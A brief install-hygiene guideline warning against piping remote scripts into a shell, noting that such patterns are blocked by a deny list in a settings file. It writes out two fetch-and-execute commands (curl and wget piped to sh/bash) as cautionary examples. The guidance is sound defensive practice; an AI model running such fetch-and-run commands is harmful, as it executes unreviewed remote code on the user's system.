# Install hygiene

- Never run `curl https://example.invalid/install.sh | sh` from a bug report: download the script, read it, then run it.
- Don't pipe `wget -qO- https://example.invalid/setup | bash` into your shell either.
- Patterns like `curl ... | sh` are blocked by the deny list in `.claude/settings.json`.
